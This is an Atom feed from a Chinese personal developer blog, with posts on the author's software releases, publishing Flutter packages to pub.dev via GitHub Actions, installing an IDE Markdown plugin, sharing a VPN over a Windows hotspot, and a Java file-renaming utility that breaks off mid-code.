<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>情迁博客</title>
  
  <subtitle>情迁美好时光追忆 执拗如我 执着如我,纠结如我,虽然无法活出最好的自己,但是总算活出一个不一样的自己!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lozn.top/"/>
  <updated>2022-06-30T02:06:23.267Z</updated>
  <id>https://lozn.top/</id>
  
  <author>
    <name>情随事迁</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://lozn.top/2022/06/30/soft_use_status/"/>
    <id>https://lozn.top/2022/06/30/soft_use_status/</id>
    <published>2022-06-30T02:06:23.267Z</published>
    <updated>2022-06-30T02:06:23.267Z</updated>
    
    <content type="html"><![CDATA[<p>title:有关新软件旧软件相关情况<br>date: 2021-4-21</p><p>####### 请注意,部分软件仅供学习使用,下载后于24小时内删除,请勿贩卖,非法盈利是违法行为!后果自负!<br>2021-05-03 14:29:00</p><p>有关q++ ,v++软件不再更新,机器人软件和我新开发的一个神之手还是可以继续维护的,因为这两个软件不涉及到一些法律风险.<br>神之手为一款19年研发的免root加载xposed框架,方便测试人员,开发人员进行极客体验的框架,使用出现软件被篡改导致被封号情况后果自负!这里一切软件都只是为了研究技术使用,不得用于违法,商业用途!<br>否则后果和我一样,<br>hookui是我几年前写的软件，现在免费拿出来，给喜欢逆向的朋友们。</p><p><a href="http://otads.yhzu.cn/">买东西别上淘宝了,没有优惠券的.直接来这里</a></p><h4 id="如果发现有人利用非商业软件进行-贩卖-请截图发给我-qq3508264"><a href="#如果发现有人利用非商业软件进行-贩卖-请截图发给我-qq3508264" class="headerlink" title="如果发现有人利用非商业软件进行 贩卖   请截图发给我 qq3508264"></a>如果发现有人利用非商业软件进行 贩卖   请截图发给我 qq3508264</h4><pre><code>2017-2-21 19:38:23</code></pre><p><a href="http://lojunx.github.io/about">点击这里</a></p><h4 id="如果你经济条件比较好-能够自己养活自己-可以打赏我"><a href="#如果你经济条件比较好-能够自己养活自己-可以打赏我" class="headerlink" title="如果你经济条件比较好,能够自己养活自己 可以打赏我"></a>如果你经济条件比较好,能够自己养活自己 可以打赏我</h4><p><a href="http://lojunx.github.io/about">先打赏再通知我也可以点击这里</a></p><h4 id="想下载我开发的所有个人软件"><a href="#想下载我开发的所有个人软件" class="headerlink" title="想下载我开发的所有个人软件?"></a>想下载我开发的所有个人软件?</h4><p>点击将会进入网盘，包括pc软件和手机软件</p><p><a href="https://lojunx.github.io/update/qq_redpackaget.html">点击进行跳转</a></p><p>##########</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;title:有关新软件旧软件相关情况&lt;br&gt;date: 2021-4-21&lt;/p&gt;
&lt;p&gt;####### 请注意,部分软件仅供学习使用,下载后于24小时内删除,请勿贩卖,非法盈利是违法行为!后果自负!&lt;br&gt;2021-05-03 14:29:00&lt;/p&gt;
&lt;p&gt;有关q++ 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://lozn.top/2022/06/30/hello-world%E4%B8%8Ehexo%E7%9A%84%E5%BC%80%E5%A7%8B/"/>
    <id>https://lozn.top/2022/06/30/hello-world与hexo的开始/</id>
    <published>2022-06-30T02:06:23.259Z</published>
    <updated>2022-06-30T02:06:23.259Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【原创】flutter之发布插件包到pubdev离线在线两套大法</title>
    <link href="https://lozn.top/2022/03/05/%E3%80%90%E5%8E%9F%E5%88%9B%E3%80%91flutter%E4%B9%8B%E5%8F%91%E5%B8%83%E6%8F%92%E4%BB%B6%E5%8C%85%E5%88%B0pub-dev%E7%A6%BB%E7%BA%BF%E5%9C%A8%E7%BA%BF%E4%B8%A4%E5%A5%97%E5%A4%A7%E6%B3%95/"/>
    <id>https://lozn.top/2022/03/05/【原创】flutter之发布插件包到pub-dev离线在线两套大法/</id>
    <published>2022-03-05T14:30:15.000Z</published>
    <updated>2022-06-30T02:06:23.267Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/869a86f4924c">【原创】flutter之发布插件包到pubdev离线在线两套大法</a><br>文章字数：1627,阅读全文大约需要6分钟</p><h2 id="发布何种包？"><a href="#发布何种包？" class="headerlink" title="发布何种包？"></a>发布何种包？</h2><p>首先 包分2种一种是纯dart包，不包含android. ios桥接代码, 另外一种 是 插件包，根据需求创建不同的包<br>（模块是另外一种，主要是用于安卓引用flutter模块的，是需要指定ios android包名的，因为它直接运行的时候会产生临时的.android文件夹来配置一个包名，而且clear会删掉缓存。）<br><img src="https://upload-images.jianshu.io/upload_images/2815884-2912029c07fbe01c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="创建插件"><a href="#创建插件" class="headerlink" title="创建插件"></a>创建插件</h2><p>在android studio 配置了flutter插件后可以看到 plugin和package, 对应android ios这种需要桥接的模板，和 纯package包。<br>选择下一步就行了。</p><p>首先在根目录配置插件，其实也是正常的写代码，把类创建好，main.dart可删除，</p><h2 id="创建子项目（案例）"><a href="#创建子项目（案例）" class="headerlink" title="创建子项目（案例）"></a>创建子项目（案例）</h2><p>然后再基于此目录<code>flutter create example</code> 创建样例文件夹<br>然后在里面的main.dart写上代码</p><p>在此exmaple的<code>pubspec.yaml</code>引用根目录（插件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dependencies:</span><br><span class="line">  smart_gridded_pageview:</span><br><span class="line">    path: ../</span><br></pre></td></tr></table></figure><p>当然如果你觉得这样蛋疼你可以复制同样的代码到里面写，但是你不觉得这样很奇怪吗？<br>或者你觉得这个包一定会发布，你直接先在线引用写死也行，当然这些方法统统不方便，加入你升级版本呢？</p><h2 id="插件种引用其他插件？"><a href="#插件种引用其他插件？" class="headerlink" title="插件种引用其他插件？"></a>插件种引用其他插件？</h2><p>同样在根目录的yaml下插入即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dependencies:</span><br></pre></td></tr></table></figure><h2 id="包名版本"><a href="#包名版本" class="headerlink" title="包名版本"></a>包名版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name: smart_gridded_pageview</span><br><span class="line">description: Automatically wrap the content, produce the height according to the content, and support page turning custom indicator</span><br><span class="line">version: 0.0.3</span><br><span class="line">homepage: https://https://github.com/qssq/smart_grid_pageview</span><br></pre></td></tr></table></figure><p>hompage最好指定源码目录，方便用户定位反馈。</p><h2 id="图片显示"><a href="#图片显示" class="headerlink" title="图片显示"></a>图片显示</h2><p>在插件目录也就是根目录结构的Readme.md里面</p><p>的图片要正常显示不能使用相对路径，所以我发布了2次都无法显示图片,所以我直接用github的图片作为显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/qssq/smart_grid_pageview/master/example/assets/pic.png</span><br></pre></td></tr></table></figure><h3 id="预发布"><a href="#预发布" class="headerlink" title="预发布"></a>预发布</h3><p><code> flutter pub publish --dry-run -v</code><br>不会真正发布，但是会检测是否有一些错误问题</p><h3 id="发布包到pub-dev"><a href="#发布包到pub-dev" class="headerlink" title="发布包到pub.dev"></a>发布包到pub.dev</h3><p>1.如果你能在命令行ping 通google.com则不需要设置代理。</p><p>2.记得修改代码<br>LICENSE里面的TODO无论如何都必须干掉，<br>3.如果ping不同google.com则设置http代理<br>window mac linux 都类似，下面是window的方法,linux方法也是设置变量名http_proxy 和https_proxy window应该不区分大小写的，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set HTTP_PROXY=127.0.0.1:1080</span><br><span class="line">set HTTPS_PROXY=127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>window shell </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Env:http_proxy=&quot;http://127.0.0.1:1080&quot;;$Env:https_proxy=&quot;http://127.0.0.1:1080&quot;</span><br></pre></td></tr></table></figure><p>执行发布<br>【本地发布法】<br><code>flutter pub publish --server=https://pub.dartlang.org  -v</code><br>因为国内普遍都设置了镜像的环境便利，这里必须指定服务器server为<code>pub.dartlang.org</code></p><p>此方法没坑还好，有坑就死翘翘了，我分别使用了cla**,v2**之类的都不行，设置了代理端口不生效，而cla开启tun模式，在cmd下可以不输入直接ping通google的，但是依然有错误，可能是我的vpn没给钱的原因。。。<br>如果已经可以ping通大概率会看到一个网址，需要复制进行打开，登录谷歌授权就行了，这时候会在本地产生一个credentials.json文件，自动发布的时候就比较有用了，我本地大法没成功，但是这一步是走通了的。</p><p>另外pub.dev还有信任开发者一说，这个我也弄好了，弄好之后就可以把发布的包移动到信任开发者域名下了，</p><p>认证域名必须dns解析大法，用github子站法是行不通了，虽然能认证但是过不了pub.dev大法认证，我特意整了一个域名lozn.top 我给为了防止过期，我给续费10年比较便宜就300，</p><p>【自动发布法】<br> 使用自动发布法可以实现提交代码就自动发布，设置tag就自动发布。<br>action语法大概</p><figure class="highlight plaintext"><figcaption><span>create ```表示创建标签就出发action任务 进行发布。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>on:<br>  push:<br>    branches: [ master ]<br>  pull_request:<br>    branches: [ master ]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">表示推送代码就会执行action任务 进行发布。</span><br></pre></td></tr></table></figure><p>$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">表示引用serret变量，</span><br><span class="line">DART_PUB_CREDENTIAL_JSON 的提取方法：</span><br><span class="line"></span><br><span class="line">全局搜索 ```pub-credentials.json```或者 ```credentials.json```</span><br><span class="line"></span><br><span class="line">我电脑在如下目录</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>C:\Users\Administrator\AppData\Roaming\dart</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">格式如下</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```&#123;&quot;accessToken&quot;:&quot;xxxN4uofsg&quot;,&quot;refreshToken&quot;:&quot;xxxxxxx&quot;,&quot;tokenEndpoint&quot;:&quot;https://accounts.google.com/o/oauth2/token&quot;,&quot;scopes&quot;:[&quot;openid&quot;,&quot;https://www.googleapis.com/auth/userinfo.email&quot;],&quot;expiration&quot;:1646488878682&#125;```</span><br><span class="line">在当前github项目下进入设置找到secret找到变量的英文单词，定义变量名为```DART_PUB_CREDENTIAL_JSON ```把json的内容复制进去就行，</span><br><span class="line">![image.png](https://upload-images.jianshu.io/upload_images/2815884-125050e080f05a91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line"></span><br><span class="line">下面是完整action代码</span><br></pre></td></tr></table></figure><p>name: Publish to Pub.dev</p><p>on:<br>  push:<br>    branches: [ master ]<br>  pull_request:<br>    branches: [ master ]</p><p>jobs:<br>  build:<br>    runs-on: ubuntu-latest<br>    #if: github.ref !&#x3D; ‘refs&#x2F;heads&#x2F;master’<br>    steps:<br>      - name: Checkout<br>        uses: actions&#x2F;checkout@v1<br>      - name: Publish Dart&#x2F;Flutter package<br>        uses: k-paxian&#x2F;dart-package-publisher@master<br>        with:<br>          flutter: true<br>          skipTests: true<br>          dryRunOnly: true<br>          credentialJson: $<br>  deploy:<br>    runs-on: ubuntu-latest<br>    #if: github.ref &#x3D;&#x3D; ‘refs&#x2F;heads&#x2F;master’<br>    steps:<br>      - name: Checkout<br>        uses: actions&#x2F;checkout@v1<br>      - name: Publish Dart&#x2F;Flutter package<br>        uses: k-paxian&#x2F;dart-package-publisher@master<br>        with:<br>          flutter: true<br>          skipTests: true<br>          credentialJson: $</p><pre><code>![image.png](https://upload-images.jianshu.io/upload_images/2815884-8357cd560d98dac2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)另外网上也有其它大法，不需要传递credentialJson 而是传递accessToken和 refreshToken，但是我这边反正是没成功，我用此方法就成功了，另外我还给dart-package-publisher的作者提了一个issue,不过我感觉是没戏。。反正我研究发布可是研究了3天，本地发布法怎么搞都失败了，网络发布法，我尝试过 直接在action里面指定命令，出现y的地方输入```echo y|命令名```但是都失败告终了，终于苦苦在github搜索找到了可以用的代码。下面是我发布的包···https://pub.dev/packages/smart_gridded_pageview···由于我创建了信任开发者，因此我的旗下包目录结构是这样的```https://pub.dev/publishers/lozn.top/packages```![image.png](https://upload-images.jianshu.io/upload_images/2815884-1e5570bca31afaee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)其中lozn.top是我认证的域名，所以得到的结果是这样的路径，但是在pub.dev里面是这样显示的，由于我把包移动到我的信任开发者域名下了，所以在pub.dev登录的这个界面的包就看不到了哈！ 认证开发者可以添加多个开发者邮箱，邮箱为谷歌邮箱。![image.png](https://upload-images.jianshu.io/upload_images/2815884-c222c79bb6056e0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)发布成功后，一般会收到邮件，![image.png](https://upload-images.jianshu.io/upload_images/2815884-c9f176e40e180bb4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)参考资料https://dart.dev/tools/pub/publishinghttps://flutter.io/developing-packages/这2个链接在pub.dev登录后的右上角菜单就有，可以自己打开，都有哪些好玩的东西吧！</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/869a86f4924c&quot;&gt;【原创】flutter之发布插件包到pubdev离线在线两套大法&lt;/a&gt;&lt;br&gt;文章字数：1627,阅读全文大约需要6分钟&lt;/p&gt;
&lt;h2 id=&quot;发布何种包？&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="跨平台app" scheme="https://lozn.top/categories/%E8%B7%A8%E5%B9%B3%E5%8F%B0app/"/>
    
    
      <category term="跨平台app" scheme="https://lozn.top/tags/%E8%B7%A8%E5%B9%B3%E5%8F%B0app/"/>
    
  </entry>
  
  <entry>
    <title>markdownsupport插件的安装方法</title>
    <link href="https://lozn.top/2022/01/31/markdown-support%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/"/>
    <id>https://lozn.top/2022/01/31/markdown-support插件的安装方法/</id>
    <published>2022-01-31T05:53:44.000Z</published>
    <updated>2022-06-30T02:06:23.263Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/14c3a66c8e56">markdownsupport插件的安装方法</a><br>文章字数：363,阅读全文大约需要1分钟<br>由于在公司电脑折腾成功之后发现在家里我又不会了,真是烂记性更加需要做笔记了,<br>安装choose runtime插件<br><a href="https://plugins.jetbrains.com/plugin/12836-choose-runtime">https://plugins.jetbrains.com/plugin/12836-choose-runtime</a></p><p>下载jcef</p><p><a href="https://confluence.jetbrains.com/pages/viewpage.action?pageId=221478946">https://confluence.jetbrains.com/pages/viewpage.action?pageId=221478946</a><br>官方说明<br><a href="https://plugins.jetbrains.com/docs/intellij/jcef.html#debugging">https://plugins.jetbrains.com/docs/intellij/jcef.html#debugging</a><br>下载完成后解压到目录<br>下载markdown supoort插件<br><a href="https://plugins.jetbrains.com/plugin/index?xmlId=com.shuzijun.markdown-editor">https://plugins.jetbrains.com/plugin/index?xmlId=com.shuzijun.markdown-editor</a></p><p>然后输入action choose runtime</p><p><img src="https://upload-images.jianshu.io/upload_images/2815884-9557acdad30fed4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/2815884-592b2e54ca11489c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/2815884-21087b3eb9b52d5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>这样就完成了安装,</p><p><img src="https://upload-images.jianshu.io/upload_images/2815884-80bc5ccb2dadf4ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/14c3a66c8e56&quot;&gt;markdownsupport插件的安装方法&lt;/a&gt;&lt;br&gt;文章字数：363,阅读全文大约需要1分钟&lt;br&gt;由于在公司电脑折腾成功之后发现在家里我又不会了,真是烂记性
      
    
    </summary>
    
      <category term="ide技巧" scheme="https://lozn.top/categories/ide%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="ide技巧" scheme="https://lozn.top/tags/ide%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>原创电脑vpn共享成wifi网络让所有电脑手机设备也能访问其它区域内网</title>
    <link href="https://lozn.top/2022/01/16/%5B%E5%8E%9F%E5%88%9B%5D%E7%94%B5%E8%84%91vpn%E5%85%B1%E4%BA%AB%E6%88%90wifi%E7%BD%91%E7%BB%9C%E8%AE%A9%E6%89%80%E6%9C%89%E7%94%B5%E8%84%91%E6%89%8B%E6%9C%BA%E8%AE%BE%E5%A4%87%E4%B9%9F%E8%83%BD%E8%AE%BF%E9%97%AE%E5%85%B6%E5%AE%83%E5%8C%BA%E5%9F%9F%E5%86%85%E7%BD%91/"/>
    <id>https://lozn.top/2022/01/16/[原创]电脑vpn共享成wifi网络让所有电脑手机设备也能访问其它区域内网/</id>
    <published>2022-01-16T04:42:22.000Z</published>
    <updated>2022-06-30T02:06:23.247Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/520e434ffe1c">原创电脑vpn共享成wifi网络让所有电脑手机设备也能访问其它区域内网</a><br>文章字数：871,阅读全文大约需要3分钟<br>.</p><p>下面进入网络互通的主题:vpn连接如何让当前局域网所有电脑都能直接使用.<br>不过我上次尝试失败之后我2022-1-15日心血来潮,又尝试了一下,首先要分析原因,先确认搭建一个局域网,然后手机能不能打开,ok,这个打不开就是防火墙可能有的问题 ,这个已经搞定了,然后启动vpn,发现还是不能打开,最后我确定是问题出现在了共享环节.</p><h3 id="window10设置移动热点"><a href="#window10设置移动热点" class="headerlink" title="window10设置移动热点"></a>window10设置移动热点</h3><p><img src="https://upload-images.jianshu.io/upload_images/2815884-94e78eaa7395abc7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>如下图所示<br><img src="https://upload-images.jianshu.io/upload_images/2815884-8fff750a394e234d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>然后测试搭建一个本地网站，然后手机测试是否能够访问。</p><p>打通了可以继续下一步，</p><p>打开easyconnect进行登录连接，</p><p>电脑访问 别的公司的内网，测试也是正常的。。</p><p><img src="https://upload-images.jianshu.io/upload_images/2815884-887f875d66faf6fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="把vpn本地连接-创建一个共享给本地连接4（wifi共享创建的连接）"><a href="#把vpn本地连接-创建一个共享给本地连接4（wifi共享创建的连接）" class="headerlink" title="把vpn本地连接 创建一个共享给本地连接4（wifi共享创建的连接）"></a>把vpn本地连接 创建一个共享给本地连接4（wifi共享创建的连接）</h3><p><img src="https://upload-images.jianshu.io/upload_images/2815884-c93a78c791897937.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>这时候手机打开vpn共享出来的其它远程内网地址发现也能成功访问了。</p><p>但是这时候外网打不开了,解决办法</p><p>不过这种情况如果是其他电脑有网线也有wifi的情况下，这也不是什么大的弊端。<br>另外现在的手机都支持双wifi,再连接一个wifi网络就行了。<br>原因:<br>因为wifi共享是把局域网本地连接共享给wifi</p><ul><li>第一: vpn的网络本身就没有外网，</li><li>第二:电脑目前只能创建一个共享连接,我尝试共享给另外本地网卡,似乎没效果,而且提示只能创建一个共享连接&gt;.<br>vpn共享给了(wifi创建的连接,)wifi，是不能不能同时共享的。</li></ul><h3 id="区分共享的wifi连接和vpn-连接办法"><a href="#区分共享的wifi连接和vpn-连接办法" class="headerlink" title="区分共享的wifi连接和vpn 连接办法"></a>区分共享的wifi连接和vpn 连接办法</h3><p><img src="https://upload-images.jianshu.io/upload_images/2815884-c5330a7e29bba384.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="另外一种方式"><a href="#另外一种方式" class="headerlink" title="另外一种方式"></a>另外一种方式</h3><p>把自己电脑A设置成代理服务器的方法，与电脑A同局域网内需要连接VPN的其他设备B在浏览器设置下代理即可。据网上查阅的资料描述CCproxy这款软件比较好用，官网下载安装打开即已经启动了代理服务器，无需做别的配置</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简书链接:&lt;a href=&quot;https://www.jianshu.com/p/520e434ffe1c&quot;&gt;原创电脑vpn共享成wifi网络让所有电脑手机设备也能访问其它区域内网&lt;/a&gt;&lt;br&gt;文章字数：871,阅读全文大约需要3分钟&lt;br&gt;.&lt;/p&gt;
&lt;p&gt;下面进入网络互
      
    
    </summary>
    
      <category term="网络" scheme="https://lozn.top/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="网络" scheme="https://lozn.top/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>关于某bilibli下载器缺陷下载的文件在文件夹子目录修正方法</title>
    <link href="https://lozn.top/2022/01/06/%E5%85%B3%E4%BA%8E%E6%9F%90bilibli%E4%B8%8B%E8%BD%BD%E5%99%A8%E7%BC%BA%E9%99%B7%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%87%E4%BB%B6%E5%9C%A8%E6%96%87%E4%BB%B6%E5%A4%B9%E5%AD%90%E7%9B%AE%E5%BD%95%E4%BF%AE%E6%AD%A3%E6%96%B9%E6%B3%95/"/>
    <id>https://lozn.top/2022/01/06/关于某bilibli下载器缺陷下载的文件在文件夹子目录修正方法/</id>
    <published>2022-01-06T11:53:42.000Z</published>
    <updated>2022-06-30T02:06:23.271Z</updated>
    
    <content type="html"><![CDATA[<p>简书链接:<a href="https://www.jianshu.com/p/f4f042e00cf6">关于某bilibli下载器缺陷下载的文件在文件夹子目录修正方法</a><br>文章字数：139,阅读全文大约需要1分钟<br>通过下面代码把文件夹的文件以文件夹命名并移动到和文件夹同级目录,因为子文件夹的名字取名无意义,不方便管理.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import java.io.File;</span><br><span class="line">import java.io.FilenameFilter;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class MainTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">      File rootPath= new File(&quot;C:\\my\\video\\ue4_1&quot;);</span><br><span class="line">      if(!rootPath.exists())&#123;</span><br><span class="line">          Scanner scan = new Scanner(System.in);</span><br><span class="line">          System.out.println(&quot;please input file dir：&quot;);</span><br><span class="line">          while (scan.hasNext()) &#123;// 判断是否还有输入</span><br><span class="line">           rootPath=new File(scan.next());</span><br><span class="line">           if(rootPath.isDirectory())&#123;</span><br><span class="line">               break;</span><br><span class="line">           &#125;else&#123;</span><br><span class="line">              System.out.println(&quot;输入的目录：&quot; +rootPath+&quot;不存在,情继续输入:&quot;);</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line">          scan.close();</span><br><span class="line">      &#125;</span><br><span class="line">        System.out.println(rootPath.list().length);</span><br><span class="line">        for (File currentDir : rootPath.listFiles()) &#123;</span><br><span class="line">            if(currentDir.isDirectory())&#123;</span><br><span class="line">                File[] files = currentDir.listFiles();</span><br><span class="line">                if(files!=null&amp;&amp;files.length&gt;0)&#123;</span><br><span class="line">                    if(files.length==1)&#123;</span><br><span class="line">                        File childFile = files[0];</span><br><span class="line">                        if(childFile.isFile())&#123;</span><br><span class="line">                        int i = childFile.getName().indexOf(&quot;.&quot;);</span><br><span class="line">                        File dest;</span><br><span class="line">                        if(i&gt;0)&#123;</span><br><span class="line">                            String substring = childFile.getName().substring(i);</span><br><span class="line">                             dest = new File(rootPath,currentDir.getName() +substring);</span><br><span class="line">                        &#125;else&#123;</span><br><span class="line">                             dest = new File(rootPath,currentDir.getName() + childFile.getName());</span><br><span class="line">                        &#125;</span><br><span class="line">                        boolean b = childFile.renameTo(dest);</span><br><span class="line">                        System.out.println(&quot;改名&quot;+childFile.getName()+&quot;为&quot;+dest.getAbsolutePath()+&quot;是否成功:&quot;+b);</span><br><span class="line">                        &#125;else&#123;</span><br><span class="line">                                System.out.println(&quot;忽略子文件:&quot;+childFile);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">                    for (int i = 0; i &lt; files.length; i++) &#123;</span><br><span class="line">                        File childFile = files[i];</span><br><span class="line">                        if(childFile.isFile())&#123;</span><br><span class="line">                        File dest = new File(rootPath,currentDir.getName() + childFile.getName());</span><br><span class="line">                        boolean b =childFile.renameTo(dest);</span><br><span class="line">                        